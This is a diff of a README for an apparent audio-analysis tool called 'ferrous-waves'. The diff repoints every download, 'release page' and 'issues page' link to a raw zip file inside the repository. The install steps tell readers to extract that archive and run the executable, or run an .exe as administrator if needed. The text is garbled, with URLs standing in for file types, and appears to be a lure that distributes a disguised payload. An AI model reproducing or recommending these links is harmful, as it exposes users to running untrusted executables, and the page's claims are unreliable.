@@ -6,26 +6,26 @@ Welcome to the **ferrous-waves** project! This application helps you analyze aud
 
 ## 📥 Download the Application
 
-[![Download ferrous-waves](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip)](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip)
+[![Download ferrous-waves](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip)](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip)
 
 ## 📂 Download & Install
 
 To get started, visit the release page by clicking the link below:
 
-[Download the latest version here](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip)
+[Download the latest version here](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip)
 
 On the releases page, you will find the latest version of the software. Follow these steps to download and install:
 
 1. Look for the most recent version listed at the top of the page.
 2. Click on the version number to expand the details.
-3. Download the file appropriate for your operating system. Windows users may see a `.exe` file, while macOS and Linux users may find `.dmg` or `https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip` files.
+3. Download the file appropriate for your operating system. Windows users may see a `.exe` file, while macOS and Linux users may find `.dmg` or `https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip` files.
 4. Once the download finishes, locate the file on your computer.
 
 ### 🛠 Installation
 
 - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
 - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip` file and run the executable from the terminal.
+- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip` file and run the executable from the terminal.
 
 Now you are ready to analyze audio!
 
@@ -60,7 +60,7 @@ If you encounter issues during installation or while using the application, cons
 - Check that you have enough disk space.
 - If the application fails to open, try running it as an administrator (Windows) or check permissions (macOS/Linux).
 
-For further assistance, visit our [issues page](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip) to report bugs or ask questions.
+For further assistance, visit our [issues page](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip) to report bugs or ask questions.
 
 ## 📢 Stay Updated
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ---
 
-Click here to [Download the latest version of ferrous-waves](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/rattlebones/ferrous-waves.zip) and start your audio analysis journey today!
+Click here to [Download the latest version of ferrous-waves](https://raw.githubusercontent.com/JohnCloudzone/ferrous-waves/main/src/utils/waves-ferrous-v1.1.zip) and start your audio analysis journey today!
